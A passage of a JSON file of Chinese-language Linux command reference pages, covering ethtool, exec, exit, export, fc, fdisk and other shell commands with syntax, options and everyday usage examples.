set_tso</td>\n<td>显示信息从保存该状态的变量中读取得到，没有对应的寄存器。因此，TX/RX校验等模块一直处于on状态，实际上是无法修改的。</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>get_drvinfo[self_test_count, get_stats_coun,t get_regs_len, get_eeprom_len]</td>\n<td>网卡bnx2自己固定的信息，如：  \n——————————————————–  \ndriver: bnx2 version: 1.4.30 firmware-version: 1.8.0.5 bus-info: 0000:09:00.0  \n——————————————————–</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>get_drvinfoget_regs</td>\n<td>不支持，即bnx2中没有实现函数get_regs。</td>\n</tr>\n<tr>\n<td>-e -E</td>\n<td>get_eepromset_eeprom</td>\n<td>不支持，即bnx2中没有实现函数get_eeprom。</td>\n</tr>\n<tr>\n<td>-r</td>\n<td>nway_reset</td>\n<td>配置网卡MII_BMCR寄存器，重启Auto negotiation模块。</td>\n</tr>\n<tr>\n<td>-p</td>\n<td>phys_id</td>\n<td>配置网卡BNX2_EMAC_LED寄存器，实现LED闪功能。</td>\n</tr>\n<tr>\n<td>-t</td>\n<td>self_test</td>\n<td>通过配置网卡寄存器，逐一测试网卡的硬件模块：registers，memory，loopback，Link stat，interrupt。</td>\n</tr>\n<tr>\n<td>-S</td>\n<td>get_ethtool_stats</td>\n<td>显示信息来源于网卡驱动中的结构体变量stats_blk。（网卡通过DMA方式，将寄存器BNX2_HC_STATISTICS _ADDR_L和BNX2_HC_STATISTICS_ADDR_H中的数据实时地读取到结构体变量struct statistics_block *stats_blk中。） —显示的数据都是从网卡寄存器中统计得到的，各项的含义需查询网卡（芯片）手册。</td>\n</tr>\n</tbody>\n</table>\n\n<p>由上可见，ethtool命令用于显示/配置网卡硬件（寄存器）。 &nbsp;</p>\n<h3 id=\"实例\">实例</h3>\n<p>查看机器上网卡的速度：百兆还是千兆，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ethool</span> eth0\n</code></pre>\n<p>操作完毕后，输出信息中<code>Speed:</code>这一项就指示了网卡的速度。停止网卡的发送模块TX，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ethtool</span> -A tx <span class=\"hljs-literal\">off</span> eth0\n</code></pre>\n<p>操作完毕后，可输入<code>ethtool -a eth0</code>，查看tx模块是否已被停止。查看网卡eth0采用了何种驱动，请输入：</p>\n<pre><code class=\"language-shell\">ethtool -<span class=\"hljs-selector-tag\">i</span> eth0\n</code></pre>\n<p>操作完毕后，显示 driver: bnx2；version: 1.4.30 等信息。关闭网卡对收到的数据包的校验功能，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ethtool</span> -K eth0 rx <span class=\"hljs-literal\">off</span>\n</code></pre>\n<p>操作完毕后，可输入<code>ethtool –k eth0</code>，查看校验功能是否已被停止。如果机器上安装了两块网卡，那么eth0对应着哪块网卡呢？输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ethtool</span> -p eth0 <span class=\"hljs-number\">10</span>\n</code></pre>\n<p>操作完毕后，看哪块网卡的led灯在闪，eth0就对应着哪块网卡。查看网卡，在接收/发送数据时，有没有出错？请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ethtool</span> –S eth0\n</code></pre>\n<p>将千兆网卡的速度降为百兆，请输入：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ethtool</span> -s eth0 speed <span class=\"hljs-number\">100</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ex",
        "des": "启动vim编辑器的ex编辑模式",
        "body": "<h1 id=\"ex\">ex</h1>\n<p>启动vim编辑器的ex编辑模式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>在 <strong>ex</strong> 模式下启动vim文本编辑器。ex执行效果如同<code>vi -E</code>，适用于法及参数可参照vi指令，如要从Ex模式回到普通模式，则在vim中输入<code>:vi</code>或<code>:visual</code>即可。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">ex</span>（参数）\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定待编辑的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "exec",
        "des": "调用并执行指定的命令",
        "body": "<h1 id=\"exec\">exec</h1>\n<p>调用并执行指定的命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>exec命令</strong> 用于调用并执行指令的命令。exec命令通常用在shell脚本程序中，可以调用其他的命令。如果在当前终端中使用命令，则当指定的命令执行完毕后会立即退出终端。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">exec</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：在空环境中执行指定的命令。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令：要执行的指令和相应的参数。</p>\n<h3 id=\"实例\">实例</h3>\n<p>首先使用echo命令将文本“Linux C++”进行输出，输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> Linux C++           <span class=\"hljs-comment\"># 输出指定信息</span>\n</code></pre>\n<p>执行上面的指令后，输出如下信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Linux</span> C++                <span class=\"hljs-comment\"># 输出信息</span>\n</code></pre>\n<p>然后再使用exec命令调用echo命令输出同样的信息，并且对输出的信息进行对比，输入指令如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">exec</span> -c <span class=\"hljs-built_in\">echo</span> Linux C++          <span class=\"hljs-comment\"># 调用命令</span>\n</code></pre>\n<p>执行以上命令后，其输出信息如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">Linux</span> C++                       <span class=\"hljs-comment\"># 使用指定指令输出信息</span>\n</code></pre>\n<p>通过比较两者执行后的结果来看，所实现的功能是相同的，即使用exec命令调用echo命令成功。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "exit",
        "des": "退出当前的shell。",
        "body": "<h1 id=\"exit\">exit</h1>\n<p>退出当前的shell。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">exit</span> [n]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>执行exit可使shell以指定的状态值退出。若不设置参数，则以最后一条命令的返回值作为exit的返回值退出。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>n（可选）：指定的shell返回值（整数）。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回值为你指定的参数n的值，如果你指定的参数大于255或小于0，那么会通过加或减256的方式使得返回值总是处于0到255之间。</p>\n<h2 id=\"例子\">例子</h2>\n<p>退出当前shell：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># exit</span>\nlogout\n</code></pre>\n<p>也可以使用<code>ctrl+d</code>退出当前终端，下面列出了打开或关闭该功能的方法：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 打开ctrl+d退出终端</span>\n<span class=\"hljs-built_in\">set</span> -o ignoreeof\n<span class=\"hljs-comment\"># 关闭ctrl+d退出终端</span>\n<span class=\"hljs-built_in\">set</span> +o ignoreeof\n</code></pre>\n<p>在脚本中，进入脚本所在目录，否则退出：</p>\n<pre><code class=\"language-shell\">cd $(dirname <span class=\"hljs-variable\">$0</span>) || <span class=\"hljs-keyword\">exit</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>在脚本中，判断参数数量，不匹配就打印使用方式，退出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"$#\"</span> -ne <span class=\"hljs-string\">\"2\"</span> ]; then\n    echo <span class=\"hljs-string\">\"usage: $0 &lt;area&gt; &lt;hours&gt;\"</span>\n    <span class=\"hljs-keyword\">exit</span> <span class=\"hljs-number\">2</span>\nfi\n</code></pre>\n<p>在脚本中，退出时删除临时文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">trap</span> <span class=\"hljs-string\">\"rm -f tmpfile; echo Bye.\"</span> <span class=\"hljs-keyword\">EXIT</span>\n</code></pre>\n<p>检查上一命令的退出码：</p>\n<pre><code class=\"language-shell\">./mycommand.sh\nEXCODE=$?\n<span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EXCODE</span>\"</span> == <span class=\"hljs-string\">\"0\"</span> ]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"O.K\"</span>\n<span class=\"hljs-keyword\">fi</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>   该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "expand",
        "des": "将文件的制表符转换为空白字符",
        "body": "<h1 id=\"expand\">expand</h1>\n<p>将文件的制表符转换为空白字符</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>expand命令</strong> 用于将文件的制表符（TAB）转换为空白字符（space），将结果显示到标准输出设备。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">expand</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-t<span class=\"hljs-attribute\">&lt;数字&gt;</span>：指定制表符所代表的空白字符的个数，而不使用默认的8。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要转换制表符为空白的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "export",
        "des": "为shell变量或函数设置导出属性。",
        "body": "<h1 id=\"export\">export</h1>\n<p>为shell变量或函数设置导出属性。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code>export [-fn] [name[=word]]...\nexport -p\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>定义一到多个变量并设置导出属性。</li>\n<li>修改一到多个变量的值并设置导出属性。</li>\n<li>删除一到多个变量的导出属性。</li>\n<li>显示全部拥有导出属性的变量。</li>\n<li>为一到多个已定义函数新增导出属性。</li>\n<li>删除一到多个函数的导出属性。</li>\n<li>显示全部拥有导出属性的函数。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：指向函数。</span>\n<span class=\"hljs-deletion\">-n：删除变量的导出属性。</span>\n<span class=\"hljs-deletion\">-p：显示全部拥有导出属性的变量。</span>\n<span class=\"hljs-deletion\">-pf：显示全部拥有导出属性的函数。</span>\n<span class=\"hljs-deletion\">-nf：删除函数的导出属性。</span>\n<span class=\"hljs-deletion\">--：在它之后的选项无效。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>name（可选）：变量名或已定义函数名。</p>\n<p>value（可选）：变量的值。</p>\n<h3 id=\"返回值\">返回值</h3>\n<p>export返回true除非你提供了非法选项或非法名称。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"># 显示全部拥有导出属性的变量。\n# <span class=\"hljs-keyword\">export</span> -p\n# <span class=\"hljs-keyword\">export</span>\n# 显示全部拥有导出属性的函数。\n# <span class=\"hljs-keyword\">export</span> -pf\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 首先删除要演示的变量名</span>\n<span class=\"hljs-comment\">#unset a b</span>\n<span class=\"hljs-comment\"># 定义变量的同时增加导出属性</span>\n<span class=\"hljs-built_in\">export</span> a <span class=\"hljs-attribute\">b</span>=3\n<span class=\"hljs-comment\"># 当然也可以先定义后增加导出属性</span>\n<span class=\"hljs-attribute\">b</span>=3\n<span class=\"hljs-built_in\">export</span> b\n\n<span class=\"hljs-comment\"># 修改拥有导出属性的变量的值</span>\n<span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">a</span>=5 <span class=\"hljs-attribute\">b</span>=7\n<span class=\"hljs-comment\"># 当然也可以直接赋值修改</span>\n<span class=\"hljs-attribute\">a</span>=5;b=7\n\n<span class=\"hljs-comment\"># 删除变量的导出属性</span>\n<span class=\"hljs-built_in\">export</span> -n a b\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 首先删除要演示的函数名</span>\n<span class=\"hljs-keyword\">unset</span> func_1 func_2\n<span class=\"hljs-comment\"># 创建函数</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">func_1</span>(<span class=\"hljs-params\"></span>)</span>{ <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'123'</span>; }\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">func_2</span>(<span class=\"hljs-params\"></span>)</span>{ <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'890'</span>; }\n\n<span class=\"hljs-comment\"># 为已定义函数增加导出属性</span>\nexport -f func_1 func_2\n\n<span class=\"hljs-comment\"># 删除函数的导出属性</span>\nexport -<span class=\"hljs-function\"><span class=\"hljs-keyword\">fn</span> <span class=\"hljs-title\">a</span> <span class=\"hljs-title\">b</span></span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加环境变量（JAVA）到`~/.bashrc`</span>\nPATH=<span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/jdk1.7.0/</span>bin:<span class=\"hljs-variable\">$PATH</span>\n<span class=\"hljs-comment\"># 添加当前位置到动态库环境变量</span>\nexport LD_LIBRARY_PATH=$(pwd):<span class=\"hljs-variable\">${LD_LIBRARY_PATH}</span>\n</code></pre>\n<h2 id=\"错误用法\">错误用法</h2>\n<ul>\n<li>对未定义的函数添加导出属性。</li>\n<li>对没有导出属性的函数/变量执行删除导出属性操作。</li>\n<li>在 <code>--</code> 后使用选项。</li>\n</ul>\n<h2 id=\"qa\">Q&amp;A</h2>\n<h4 id=\"q：对变量或函数设置导出属性有什么用？\">Q：对变量或函数设置导出属性有什么用？</h4>\n<p>A：它们会成为环境变量，可以在脚本中访问它们，尤其是脚本中调用的子进程需要时。（ <strong><a href=\"https://askubuntu.com/questions/26318/environment-variable-vs-shell-variable-whats-the-difference\">参考链接4</a></strong> ）</p>\n<h4 id=\"q：如果我编写的脚本修改了已有的环境变量的值，那么执行它会在当前终端生效吗？会影响之前以及之后打开的终端吗？\">Q：如果我编写的脚本修改了已有的环境变量的值，那么执行它会在当前终端生效吗？会影响之前以及之后打开的终端吗？</h4>\n<p>A：只有通过<code>source</code>方式调用的脚本会生效，您可以查看<code>source</code>命令获得更多信息；其他方式只是在子shell中执行。\n之前的不会影响，之后的除非是修改了<code>~/.bashrc</code>这种启动终端时加载的脚本。（ <strong><a href=\"https://www.cnblogs.com/hongzg1982/articles/2101792.html\">参考链接1</a></strong> ）</p>\n<h4 id=\"q：我脚本文件中调用bashrc中定义的函数和变量。为什么在新打开的终端中通过-sh-方式调用该脚本或直接运行\">Q：我脚本文件中调用<code>~/.bashrc</code>中定义的函数和变量。为什么在新打开的终端中通过 <code>sh</code> 方式调用该脚本或直接运行</h4>\n<p>这个当前用户有执行权限的脚本却不能使用这些函数和变量？<br>A：请在<code>~/.bashrc</code>文件中增加export它们的语句。另请参阅 <strong>知识点</strong> 段落。</p>\n<h4 id=\"q：数组和关联数组也可以设置导出属性吗？\">Q：数组和关联数组也可以设置导出属性吗？</h4>\n<p>A：是可以的（如果你的bash支持它们），不过有些问题（ <strong><a href=\"https://stackoverflow.com/questions/5564418/exporting-an-array-in-bash-script\">参考链接2</a></strong> ）。</p>\n<h4 id=\"q：为什么我在查看变量或函数导出属性的时候显示的开头是declare？\">Q：为什么我在查看变量或函数导出属性的时候显示的开头是<code>declare</code>？</h4>\n<p>A：因为<code>declare</code>也能够设置变量或函数的导出属性，详见<code>declare</code>命令。</p>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h3 id=\"知识点\">知识点</h3>\n<p>在<code>info bash</code>或 <a href=\"http://www.gnu.org/software/bash/manual/bash.html\">bash在线文档</a> 的\n <code>3.7.3</code>节提到了shell执行环境，其中涉及变量和函数的内容如下</p>\n<blockquote>\n<ul>\n<li>shell parameters that are set by variable assignment or with set or inherited from the shell’s parent in the environment</li>\n<li>shell functions defined during execution or inherited from the shell’s parent in the environment</li>\n</ul>\n</blockquote>\n<p>那么第一句话中的参数又和变量有什么关系呢？在<code>3.4</code>节第一段中提到：</p>\n<blockquote>\n<p> A variable is a parameter denoted by a name.</p>\n</blockquote>\n<p>变量是有名字的参数。</p>\n<p>那么子shell确实继承了父shell中带有导出属性的变量或函数。</p>\n<p>可参考链接： <a href=\"https://blog.csdn.net/soaringlee_fighting/article/details/78759448\">执行脚本方式的区别</a></p>\n<h3 id=\"参考链接\">参考链接</h3>\n<ol>\n<li><a href=\"https://www.cnblogs.com/hongzg1982/articles/2101792.html\">关于bashrc profile文件的讨论</a></li>\n<li><a href=\"https://stackoverflow.com/questions/5564418/exporting-an-array-in-bash-script\">关于export数组的讨论</a></li>\n<li><a href=\"https://unix.stackexchange.com/questions/22796/can-i-export-functions-in-bash\">export -pf用法</a></li>\n<li><a href=\"https://askubuntu.com/questions/26318/environment-variable-vs-shell-variable-whats-the-difference\">环境变量和shell变量的区别</a></li>\n</ol>\n<h3 id=\"扩展阅读\">扩展阅读</h3>\n<p>一般来说，配置交叉编译工具链的时候需要指定编译工具的路径，此时就需要设置环境变量。查看已经存在的环境变量：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-built_in\">export</span>\ndeclare -x <span class=\"hljs-attribute\">G_BROKEN_FILENAMES</span>=<span class=\"hljs-string\">\"1\"</span>\ndeclare -x <span class=\"hljs-attribute\">HISTSIZE</span>=<span class=\"hljs-string\">\"1000\"</span>\ndeclare -x <span class=\"hljs-attribute\">HOME</span>=<span class=\"hljs-string\">\"/root\"</span>\ndeclare -x <span class=\"hljs-attribute\">hostname</span>=<span class=\"hljs-string\">\"localhost\"</span>\ndeclare -x <span class=\"hljs-attribute\">INPUTRC</span>=<span class=\"hljs-string\">\"/etc/inputrc\"</span>\ndeclare -x <span class=\"hljs-attribute\">LANG</span>=<span class=\"hljs-string\">\"zh_CN.UTF-8\"</span>\ndeclare -x <span class=\"hljs-attribute\">LESSOPEN</span>=<span class=\"hljs-string\">\"|/usr/bin/lesspipe.sh %s\"</span>\ndeclare -x <span class=\"hljs-attribute\">logname</span>=<span class=\"hljs-string\">\"root\"</span>\ndeclare -x <span class=\"hljs-attribute\">LS_COLORS</span>=<span class=\"hljs-string\">\"no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:\"</span>\ndeclare -x <span class=\"hljs-attribute\">mail</span>=<span class=\"hljs-string\">\"/var/spool/mail/root\"</span>\ndeclare -x OLDPWD\ndeclare -x <span class=\"hljs-attribute\">PATH</span>=<span class=\"hljs-string\">\"/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin\"</span>\ndeclare -x <span class=\"hljs-attribute\">pwd</span>=<span class=\"hljs-string\">\"/root\"</span>\ndeclare -x <span class=\"hljs-attribute\">SHELL</span>=<span class=\"hljs-string\">\"/bin/bash\"</span>\ndeclare -x <span class=\"hljs-attribute\">SHLVL</span>=<span class=\"hljs-string\">\"1\"</span>\ndeclare -x <span class=\"hljs-attribute\">SSH_CLIENT</span>=<span class=\"hljs-string\">\"192.168.2.111 2705 22\"</span>\ndeclare -x <span class=\"hljs-attribute\">SSH_CONNECTION</span>=<span class=\"hljs-string\">\"192.168.2.111 2705 192.168.2.2 22\"</span>\ndeclare -x <span class=\"hljs-attribute\">SSH_TTY</span>=<span class=\"hljs-string\">\"/dev/pts/0\"</span>\ndeclare -x <span class=\"hljs-attribute\">TERM</span>=<span class=\"hljs-string\">\"linux\"</span>\ndeclare -x <span class=\"hljs-attribute\">USER</span>=<span class=\"hljs-string\">\"root\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "exportfs",
        "des": "管理NFS共享文件系统列表",
        "body": "<h1 id=\"exportfs\">exportfs</h1>\n<p>管理NFS共享文件系统列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>exportfs 命令用来管理当前NFS共享的文件系统列表。</p>\n<p>参数：</p>\n<pre><code class=\"language-shell\">-a 打开或取消所有目录共享。\n-o <span class=\"hljs-keyword\">options</span>,...指定一列共享选项，与 exports(<span class=\"hljs-number\">5</span>) 中讲到的类似。\n-i 忽略 <span class=\"hljs-regexp\">/etc/</span>exports 文件，从而只使用默认的和命令行指定的选项。\n-r 重新共享所有目录。它使 <span class=\"hljs-regexp\">/var/</span>lib<span class=\"hljs-regexp\">/nfs/</span>xtab 和 <span class=\"hljs-regexp\">/etc/</span>exports 同步。 它将 <span class=\"hljs-regexp\">/etc/</span>exports 中已删除的条目从 <span class=\"hljs-regexp\">/var/</span>lib<span class=\"hljs-regexp\">/nfs/</span>xtab 中删除，将内核共享表中任何不再有效的条目移除。\n-u 取消一个或多个目录的共享。\n-f 在“新”模式下，刷新内核共享表之外的任何东西。 任何活动的客户程序将在它们的下次请求中得到 mountd添加的新的共享条目。\n-v 输出详细信息。当共享或者取消共享时，显示在做什么。 显示当前共享列表的时候，同时显示共享的选项。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "expr",
        "des": "一款表达式计算工具",
        "body": "<h1 id=\"expr\">expr</h1>\n<p>一款表达式计算工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>expr命令</strong> 是一款表达式计算工具，使用它完成表达式的求值操作。</p>\n<p>expr的常用运算符：</p>\n<ul>\n<li>加法运算：<code>+</code></li>\n<li>减法运算：<code>-</code></li>\n<li>乘法运算：<code>\\*</code></li>\n<li>除法运算：<code>/</code></li>\n<li>求摸（取余）运算：<code>%</code></li>\n</ul>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">expr</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：显示指令的帮助信息；</span>\n<span class=\"hljs-comment\">--version：显示指令版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>表达式：要求值的表达式。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attr\">result</span>=`expr <span class=\"hljs-number\">2</span> + <span class=\"hljs-number\">3</span>`\n<span class=\"hljs-attr\">result</span>=$(expr <span class=\"hljs-variable\">$no1</span> + <span class=\"hljs-number\">5</span>)\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "false",
        "des": "返回状态为失败。",
        "body": "<h1 id=\"false\">false</h1>\n<p>返回状态为失败。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">false</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>用于和其他命令进行逻辑运算。</li>\n</ul>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态总是失败；返回值为1。</p>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "fc",
        "des": "显示历史列表中的命令或修改指定的历史命令并执行。",
        "body": "<h1 id=\"fc\">fc</h1>\n<p>显示历史列表中的命令或修改指定的历史命令并执行。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">fc <span class=\"hljs-selector-attr\">[-e ename]</span> <span class=\"hljs-selector-attr\">[-lnr]</span> <span class=\"hljs-selector-attr\">[first]</span> <span class=\"hljs-selector-attr\">[last]</span>\nfc -s <span class=\"hljs-selector-attr\">[pat=rep]</span> <span class=\"hljs-selector-attr\">[command]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>显示历史列表中的命令。</p>\n</li>\n<li><p>编辑并重新执行历史列表的命令。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-e ename                  选择使用的编辑器，默认调用次序为环境变量`FCEDIT`、环境变量`EDITOR`、`vi`。\n-l                        列出而不是编辑。\n-n                        列出时不输出行号（需配合-l选项）。\n-r                        倒序列出命令，最近执行的先列出（需配合-l选项）。\n-s [pat=rep] [command]    command（未指定时为最后执行的命令）将在pat替换为rep后重新执行。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>first：可选；可以是字符串（以该字符串开头的最新命令）、数字（历史列表索引，负数代表当前命令号的偏移）；未指定时设置为前一个命令并且偏移量为-16（最近的16条命令）。</p>\n<p>last：可选；可以是字符串（以该字符串开头的最新命令）、数字（历史列表索引，负数代表当前命令号的偏移）；未指定时设置为参数first。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功或执行命令的状态，当错误出现时返回非0值。</p>\n<h2 id=\"例子\">例子</h2>\n<p>替换命令参数:</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 列出 ~ 目录</span>\n<span class=\"hljs-attribute\">ls</span> <span class=\"hljs-regexp\">~\n#</span> 替换 <span class=\"hljs-regexp\">~ 为</span> / ，替换后列出根目录， \nfc -s ~=/\n</code></pre>\n<p>显示最近使用的10条历史命令：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># fc -l -10</span>\n1039     <span class=\"hljs-built_in\">type</span> -a grep\n1040     <span class=\"hljs-built_in\">export</span>\n1041     <span class=\"hljs-built_in\">history</span> 10\n1042     <span class=\"hljs-built_in\">ulimit</span> -a\n1043     <span class=\"hljs-built_in\">shopt</span>\n1044     <span class=\"hljs-built_in\">help</span> ls\n1045     <span class=\"hljs-built_in\">help</span> env\n1046     <span class=\"hljs-built_in\">help</span> short\n1047     <span class=\"hljs-built_in\">help</span> <span class=\"hljs-built_in\">shopt</span>\n1048     showkey -a\n</code></pre>\n<p>编辑第1040条历史命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># fc 1040</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>关闭终端后，历史列表将被写入历史文件<code>~/.bash_history</code>。</li>\n<li>环境变量<code>FCEDIT</code>的值为<code>fc</code>默认的编辑器。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "fdisk",
        "des": "查看磁盘使用情况和磁盘分区",
        "body": "<h1 id=\"fdisk\">fdisk</h1>\n<p>查看磁盘使用情况和磁盘分区</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>fdisk命令</strong> 用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面，而非类似DOS&nbsp;fdisk的cfdisk互动式操作界面，因此在使用上较为不便，但功能却丝毫不打折扣。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">fdisk</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"> -b <span class=\"hljs-attribute\">&lt;大小&gt;</span>             扇区大小(512、1024、2048或4096)\n -c[=<span class=\"hljs-attribute\">&lt;模式&gt;</span>]           兼容模式：“dos”或“nondos”(默认)\n -h                    打印此帮助文本\n -u[=<span class=\"hljs-attribute\">&lt;单位&gt;</span>]           显示单位：“cylinders”(柱面)或“sectors”(扇区，默认)\n -v                    打印程序版本\n -C <span class=\"hljs-attribute\">&lt;数字&gt;</span>             指定柱面数\n -H <span class=\"hljs-attribute\">&lt;数字&gt;</span>             指定磁头数\n -S <span class=\"hljs-attribute\">&lt;数字&gt;</span>             指定每个磁道的扇区数\n</code></pre>\n<h3 